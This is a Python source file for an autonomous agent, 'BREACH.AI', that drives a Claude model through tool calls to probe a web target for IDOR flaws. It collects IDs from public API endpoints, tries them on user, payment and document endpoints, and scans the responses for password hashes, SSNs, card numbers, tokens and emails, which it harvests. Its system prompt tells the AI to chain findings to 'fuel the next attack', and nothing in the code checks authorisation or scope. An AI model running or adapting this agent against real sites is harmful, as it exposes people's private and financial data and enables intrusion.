#!/usr/bin/env python3
"""
BREACH.AI SMART AGENT
=====================

The AI agent with built-in METHODOLOGY - not just tools.

KEY INSIGHT: What humans do that AI doesn't:
1. Look at public endpoints first
2. Extract IDs from responses
3. Try those IDs on user/profile endpoints
4. Check if sensitive data is returned
5. CHAIN findings - use data from A to attack B

This agent has that methodology BUILT IN.
"""

import asyncio
import aiohttp
import json
import os
import re
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Set, Callable
from urllib.parse import urlparse, urljoin
from datetime import datetime

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()


# ============================================================================
# CONFIGURATION
# ============================================================================

ANTHROPIC_API_KEY = os.environ.get('ANTHROPIC_API_KEY', '')
ANTHROPIC_MODEL = "claude-sonnet-4-20250514"
MAX_ITERATIONS = 30


# ============================================================================
# KNOWLEDGE BASE - What the AI needs to know
# ============================================================================

# Endpoints to check for ID harvesting (public data that leaks IDs)
HARVEST_ENDPOINTS = [
    "/api/posts", "/api/feed", "/api/timeline", "/api/public",
    "/api/products", "/api/items", "/api/listings", "/api/gigs", "/api/jobs",
    "/api/users", "/api/members", "/api/profiles", "/api/people",
    "/api/comments", "/api/reviews", "/api/ratings",
    "/api/search", "/api/explore", "/api/discover", "/api/trending",
    "/api/stats", "/api/metrics", "/api/config",
]

# Endpoints to test with harvested IDs (sensitive data)
SENSITIVE_ENDPOINTS = [
    "/api/user/{id}", "/api/users/{id}", "/api/profile/{id}", "/api/profiles/{id}",
    "/api/member/{id}", "/api/members/{id}", "/api/account/{id}", "/api/accounts/{id}",
    "/api/freelancer/{id}", "/api/freelancers/{id}", "/api/company/{id}", "/api/companies/{id}",
    "/api/order/{id}", "/api/orders/{id}", "/api/payment/{id}", "/api/payments/{id}",
    "/api/document/{id}", "/api/documents/{id}", "/api/file/{id}", "/api/files/{id}",
]

# Data patterns that indicate a breach (sensitive fields)
SENSITIVE_PATTERNS = {
    "password_hash": r'"(password|passwd|pwd|hash|password_hash|hashed_password)":\s*"[^"]{20,}"',
    "email": r'"(email|e-mail|mail)":\s*"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"',
    "phone": r'"(phone|mobile|tel|telephone)":\s*"[\+\d\s\-\(\)]{8,}"',
    "ssn": r'"(ssn|social_security|tin)":\s*"\d{3}-?\d{2}-?\d{4}"',
    "credit_card": r'"(card|cc|credit_card|card_number)":\s*"\d{13,19}"',
    "api_key": r'"(api_key|apikey|secret|token|access_token)":\s*"[a-zA-Z0-9_\-]{20,}"',
    "address": r'"(address|street|location|home_address)":\s*"[^"]{10,}"',
    "salary": r'"(salary|income|wage|payment)":\s*[\d,]+',
}


# ============================================================================
# AGENT STATE
# ============================================================================

@dataclass
class AgentState:
    """State maintained during the assessment."""
    target: str
    cookies: Dict[str, str] = field(default_factory=dict)

    # Harvested data
    harvested_ids: Set[str] = field(default_factory=set)
    harvested_emails: Set[str] = field(default_factory=set)

    # Findings
    findings: List[dict] = field(default_factory=list)

    # Response history
    last_response: Dict = field(default_factory=dict)
    last_response_body: str = ""

    # Stats
    requests_made: int = 0
    iteration: int = 0

    # Vulnerable endpoints confirmed
    vulnerable_endpoints: List[str] = field(default_factory=list)


# ============================================================================
# TOOLS FOR THE AI
# ============================================================================

TOOLS = [
    {
        "name": "fetch_endpoint",
        "description": "Fetch a URL endpoint and return the response. Use this to probe for data.",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "The endpoint path to fetch (e.g., /api/users)"
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST", "PUT", "DELETE"],
                    "default": "GET"
                },
                "body": {
                    "type": "object",
                    "description": "Optional request body for POST/PUT"
                }
            },
            "required": ["path"]
        }
    },
    {
        "name": "harvest_ids",
        "description": "Look for public endpoints that leak user/resource IDs. This is the FIRST step - find IDs before testing them.",
        "input_schema": {
            "type": "object",
            "properties": {
                "focus": {
                    "type": "string",
                    "description": "Type of IDs to harvest (users, products, all)"
                }
            }
        }
    },
    {
        "name": "test_idor",
        "description": "Test if a sensitive endpoint can be accessed with harvested IDs. This is AFTER harvesting IDs.",
        "input_schema": {
            "type": "object",
            "properties": {
                "endpoint_pattern": {
                    "type": "string",
                    "description": "Endpoint pattern with {id} placeholder (e.g., /api/user/{id})"
                },
                "ids_to_test": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Specific IDs to test (uses harvested IDs if empty)"
                }
            },
            "required": ["endpoint_pattern"]
        }
    },
    {
        "name": "extract_all_ids",
        "description": "Extract all IDs from the last response. Use after fetching data to find more IDs to test.",
        "input_schema": {
            "type": "object",
            "properties": {}
        }
    },
    {
        "name": "analyze_sensitive_data",
        "description": "Analyze response for sensitive data (passwords, emails, SSN, etc.). Use after getting a successful response.",
        "input_schema": {
            "type": "object",
            "properties": {}
        }
    },
    {
        "name": "report_breach",
        "description": "Report a confirmed breach/vulnerability. Use when you've found exposed sensitive data.",
        "input_schema": {
            "type": "object",
            "properties": {
                "severity": {
                    "type": "string",
                    "enum": ["critical", "high", "medium", "low"],
                    "description": "Severity of the breach"
                },
                "title": {
                    "type": "string",
                    "description": "Brief title of the vulnerability"
                },
                "description": {
                    "type": "string",
                    "description": "What was found and the impact"
                },
                "data_exposed": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Types of sensitive data exposed"
                },
                "record_count": {
                    "type": "integer",
                    "description": "Estimated number of records affected"
                },
                "proof_endpoint": {
                    "type": "string",
                    "description": "The endpoint that proves the breach"
                }
            },
            "required": ["severity", "title", "description"]
        }
    },
    {
        "name": "done",
        "description": "Mark assessment as complete. Use when you've thoroughly tested the target.",
        "input_schema": {
            "type": "object",
            "properties": {
                "summary": {
                    "type": "string",
                    "description": "Summary of what was found"
                }
            }
        }
    }
]


# ============================================================================
# SYSTEM PROMPT - THE METHODOLOGY
# ============================================================================

SYSTEM_PROMPT = """You are BREACH.AI - an autonomous security assessment agent.

YOUR METHODOLOGY (follow this order):

1. HARVEST FIRST
   - Call harvest_ids to find public endpoints that leak IDs
   - Look for user IDs, MongoDB ObjectIDs, UUIDs in responses
   - This gives you ammunition for the next step

2. TEST WITH HARVESTED IDS
   - Use test_idor with patterns like /api/user/{id}
   - Try the IDs you just harvested
   - Check if you can access other users' data

3. ANALYZE RESPONSES
   - When you get data back, use analyze_sensitive_data
   - Look for password hashes, emails, phone numbers
   - This determines severity

4. CHAIN FINDINGS
   - If you find emails, try them as usernames
   - If you find one IDOR, test similar endpoints
   - Use data from one finding to fuel the next attack

5. REPORT BREACHES
   - Use report_breach for each confirmed vulnerability
   - Include proof (endpoint, record count, data types)
   - Be specific about impact

REMEMBER:
- MongoDB ObjectIDs are 24 hex characters
- UUIDs are 36 characters with dashes
- Most vibe-coded apps don't validate IDs properly
- Public data often leaks sensitive IDs
- Always extract IDs from responses for more targets

Start by harvesting IDs, then test them systematically."""


# ============================================================================
# SMART BREACH AGENT
# ============================================================================

class SmartBreachAgent:
    """The AI agent with built-in methodology."""

    def __init__(
        self,
        target: str,
        cookie: Optional[str] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        on_progress: Optional[Callable[[int, str], None]] = None
    ):
        self.state = AgentState(target=target)
        if cookie:
            self.state.cookies = self._parse_cookie(cookie)

        # Dashboard callbacks
        self.on_finding = on_finding
        self.on_progress = on_progress

        self.session: Optional[aiohttp.ClientSession] = None

    def _parse_cookie(self, cookie: str) -> Dict[str, str]:
        """Parse cookie string into dict."""
        cookies = {}
        for part in cookie.split(';'):
            if '=' in part:
                key, value = part.strip().split('=', 1)
                cookies[key] = value
        return cookies

    async def run(self) -> Dict[str, Any]:
        """Run the autonomous assessment."""
        console.print(Panel(
            f"[bold cyan]BREACH.AI SMART AGENT[/bold cyan]\n"
            f"Target: {self.state.target}\n"
            f"Methodology: Harvest -> Test -> Analyze -> Chain",
            title="Starting Assessment"
        ))

        start_time = asyncio.get_event_loop().time()

        # Create session
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
        }

        if self.state.cookies:
            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.state.cookies.items())

        async with aiohttp.ClientSession(headers=headers) as session:
            self.session = session

            # Main agent loop
            while self.state.iteration < MAX_ITERATIONS:
                self.state.iteration += 1

                if self.on_progress:
                    progress = int((self.state.iteration / MAX_ITERATIONS) * 100)
                    self.on_progress(progress, f"Iteration {self.state.iteration}")

                console.print(f"\n[bold cyan]═══ ITERATION {self.state.iteration} ═══[/bold cyan]")

                response = await self._call_claude()
                if not response:
                    break

                done = await self._process_response(response)
                if done:
                    break

            self.session = None

        duration = asyncio.get_event_loop().time() - start_time
        self._print_report(duration)

        return {
            "target": self.state.target,
            "findings": self.state.findings,
            "vulnerable_endpoints": self.state.vulnerable_endpoints,
            "ids_harvested": list(self.state.harvested_ids),
            "emails_found": list(self.state.harvested_emails),
            "requests_made": self.state.requests_made,
            "duration": duration
        }

    async def _call_claude(self) -> Optional[dict]:
        """Call Claude API with current context."""
        if not ANTHROPIC_API_KEY:
            console.print("[red]Error: ANTHROPIC_API_KEY not set[/red]")
            return None

        # Build context message
        context = f"""Current State:
- Target: {self.state.target}
- IDs Harvested: {len(self.state.harvested_ids)} ({', '.join(list(self.state.harvested_ids)[:5])}...)
- Emails Found: {len(self.state.harvested_emails)}
- Findings: {len(self.state.findings)}
- Vulnerable Endpoints: {self.state.vulnerable_endpoints}
- Requests Made: {self.state.requests_made}

Last Response Summary:
{self.state.last_response.get('summary', 'No previous response')}

What should we do next? Remember the methodology: Harvest -> Test -> Analyze -> Chain"""

        try:
            async with aiohttp.ClientSession() as api_session:
                async with api_session.post(
                    "https://api.anthropic.com/v1/messages",
                    headers={
                        "x-api-key": ANTHROPIC_API_KEY,
                        "anthropic-version": "2023-06-01",
                        "content-type": "application/json"
                    },
                    json={
                        "model": ANTHROPIC_MODEL,
                        "max_tokens": 1024,
                        "system": SYSTEM_PROMPT,
                        "tools": TOOLS,
                        "messages": [{"role": "user", "content": context}]
                    }
                ) as resp:
                    if resp.status != 200:
                        error = await resp.text()
                        console.print(f"[red]API Error: {error}[/red]")
                        return None
                    return await resp.json()
        except Exception as e:
            console.print(f"[red]Error calling Claude: {e}[/red]")
            return None

    async def _process_response(self, response: dict) -> bool:
        """Process Claude's response and execute tools."""
        done = False

        for block in response.get("content", []):
            if block.get("type") == "text":
                console.print(f"[dim]{block.get('text', '')}[/dim]")

            elif block.get("type") == "tool_use":
                tool_name = block.get("name")
                tool_input = block.get("input", {})

                console.print(f"\n[yellow]→ {tool_name}[/yellow]", end=" ")
                if tool_input:
                    console.print(f"[dim]{json.dumps(tool_input, default=str)[:100]}[/dim]")

                result = await self._execute_tool(tool_name, tool_input)

                if tool_name == "done":
                    done = True

        return done

    async def _execute_tool(self, tool_name: str, tool_input: dict) -> dict:
        """Execute a tool and return result."""
        if tool_name == "fetch_endpoint":
            return await self._fetch_endpoint(tool_input)
        elif tool_name == "harvest_ids":
            return await self._harvest_ids(tool_input)
        elif tool_name == "test_idor":
            return await self._test_idor(tool_input)
        elif tool_name == "extract_all_ids":
            return self._extract_all_ids()
        elif tool_name == "analyze_sensitive_data":
            return self._analyze_sensitive_data()
        elif tool_name == "report_breach":
            return self._report_breach(tool_input)
        elif tool_name == "done":
            return {"status": "complete", "summary": tool_input.get("summary", "")}
        else:
            return {"error": f"Unknown tool: {tool_name}"}

    async def _fetch_endpoint(self, input: dict) -> dict:
        """Fetch an endpoint."""
        path = input.get("path", "")
        method = input.get("method", "GET")

        url = urljoin(self.state.target, path)
        self.state.requests_made += 1

        try:
            async with self.session.request(method, url, ssl=False) as resp:
                body = await resp.text()

                self.state.last_response = {
                    "status": resp.status,
                    "url": url,
                    "body_length": len(body),
                    "summary": f"Status {resp.status}, {len(body)} bytes"
                }
                self.state.last_response_body = body

                # Auto-extract IDs
                ids = self._extract_ids_from_text(body)
                self.state.harvested_ids.update(ids)

                console.print(f"[green]{resp.status}[/green] {len(body)} bytes, {len(ids)} IDs found")

                return {
                    "status": resp.status,
                    "body_preview": body[:500],
                    "ids_found": list(ids)[:10]
                }
        except Exception as e:
            return {"error": str(e)}

    async def _harvest_ids(self, input: dict) -> dict:
        """Harvest IDs from known endpoints."""
        focus = input.get("focus", "all")
        ids_found = set()
        endpoints_with_data = []

        for endpoint in HARVEST_ENDPOINTS:
            url = urljoin(self.state.target, endpoint)
            self.state.requests_made += 1

            try:
                async with self.session.get(url, ssl=False) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        ids = self._extract_ids_from_text(body)
                        if ids:
                            ids_found.update(ids)
                            endpoints_with_data.append(endpoint)
                            console.print(f"  [green]✓[/green] {endpoint}: {len(ids)} IDs")
            except:
                pass

        self.state.harvested_ids.update(ids_found)

        return {
            "total_ids": len(ids_found),
            "sample_ids": list(ids_found)[:20],
            "endpoints_with_data": endpoints_with_data
        }

    async def _test_idor(self, input: dict) -> dict:
        """Test IDOR on sensitive endpoints."""
        endpoint_pattern = input.get("endpoint_pattern", "/api/user/{id}")
        ids_to_test = input.get("ids_to_test", list(self.state.harvested_ids)[:10])

        if not ids_to_test:
            return {"error": "No IDs to test. Run harvest_ids first."}

        vulnerable = []

        for id in ids_to_test[:10]:
            path = endpoint_pattern.replace("{id}", str(id))
            url = urljoin(self.state.target, path)
            self.state.requests_made += 1

            try:
                async with self.session.get(url, ssl=False) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        self.state.last_response_body = body

                        # Check if we got real user data
                        if len(body) > 100:
                            sensitive = self._check_sensitive(body)
                            if sensitive:
                                vulnerable.append({
                                    "id": id,
                                    "endpoint": path,
                                    "sensitive_data": sensitive
                                })
                                console.print(f"  [red]🔴 VULNERABLE[/red] {path}")
            except:
                pass

        if vulnerable:
            self.state.vulnerable_endpoints.append(endpoint_pattern)

        return {
            "tested": len(ids_to_test[:10]),
            "vulnerable": len(vulnerable),
            "details": vulnerable
        }

    def _extract_all_ids(self) -> dict:
        """Extract all IDs from last response."""
        body = self.state.last_response_body
        ids = self._extract_ids_from_text(body)
        self.state.harvested_ids.update(ids)

        return {
            "ids_found": len(ids),
            "sample": list(ids)[:20],
            "total_harvested": len(self.state.harvested_ids)
        }

    def _analyze_sensitive_data(self) -> dict:
        """Analyze response for sensitive data."""
        body = self.state.last_response_body

        findings = {}
        for data_type, pattern in SENSITIVE_PATTERNS.items():
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                findings[data_type] = len(matches)

        # Extract emails
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body)
        self.state.harvested_emails.update(emails)

        return {
            "sensitive_data_found": findings,
            "emails_extracted": len(emails),
            "sample_emails": list(emails)[:5]
        }

    def _report_breach(self, input: dict) -> dict:
        """Record a breach finding."""
        finding = {
            "severity": input.get("severity"),
            "title": input.get("title"),
            "description": input.get("description"),
            "data_exposed": input.get("data_exposed", []),
            "record_count": input.get("record_count", 0),
            "proof_endpoint": input.get("proof_endpoint"),
            "timestamp": datetime.now().isoformat()
        }

        self.state.findings.append(finding)

        # Notify dashboard
        if self.on_finding:
            self.on_finding(finding)

        console.print(f"\n[bold red]🔴 BREACH REPORTED: {finding['title']}[/bold red]")
        console.print(f"[red]   Severity: {finding['severity']}[/red]")
        console.print(f"[red]   Proof: {finding['proof_endpoint']}[/red]")

        return {"status": "recorded", "finding_count": len(self.state.findings)}

    def _extract_ids_from_text(self, text: str) -> Set[str]:
        """Extract all IDs from text."""
        ids = set()

        # MongoDB ObjectIDs (24 hex chars)
        ids.update(re.findall(r'\b[a-f0-9]{24}\b', text, re.IGNORECASE))

        # UUIDs
        ids.update(re.findall(r'\b[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}\b', text, re.IGNORECASE))

        # Numeric IDs in common patterns
        ids.update(re.findall(r'"(?:id|user_id|userId|_id)"\s*:\s*(\d+)', text))
        ids.update(re.findall(r'"(?:id|user_id|userId|_id)"\s*:\s*"([^"]+)"', text))

        return ids

    def _check_sensitive(self, body: str) -> List[str]:
        """Check if response contains sensitive data."""
        found = []
        for data_type, pattern in SENSITIVE_PATTERNS.items():
            if re.search(pattern, body, re.IGNORECASE):
                found.append(data_type)
        return found

    def _print_report(self, duration: float):
        """Print final report."""
        console.print(f"\n{'═' * 60}")
        console.print(f"[bold]ASSESSMENT COMPLETE[/bold]")
        console.print(f"{'═' * 60}")

        # Summary table
        table = Table(box=box.ROUNDED)
        table.add_column("Metric", style="cyan")
        table.add_column("Value")

        table.add_row("Target", self.state.target)
        table.add_row("Duration", f"{duration:.1f}s")
        table.add_row("Iterations", str(self.state.iteration))
        table.add_row("Requests", str(self.state.requests_made))
        table.add_row("IDs Harvested", str(len(self.state.harvested_ids)))
        table.add_row("Emails Found", str(len(self.state.harvested_emails)))
        table.add_row("Findings", f"[red]{len(self.state.findings)}[/red]" if self.state.findings else "0")

        console.print(table)

        # Print findings
        if self.state.findings:
            console.print(f"\n[bold red]VULNERABILITIES FOUND:[/bold red]")
            for f in self.state.findings:
                console.print(f"\n  [{f['severity'].upper()}] {f['title']}")
                console.print(f"  {f['description']}")
                if f.get('proof_endpoint'):
                    console.print(f"\n  curl '{self.state.target}{f['proof_endpoint']}'")

        console.print(f"\n{'═' * 60}\n")


# ============================================================================
# CLI
# ============================================================================

async def main():
    import argparse

    parser = argparse.ArgumentParser(description='BREACH.AI Smart Agent')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('--cookie', help='Session cookie')

    args = parser.parse_args()

    agent = SmartBreachAgent(args.target, args.cookie)
    await agent.run()


if __name__ == '__main__':
    asyncio.run(main())
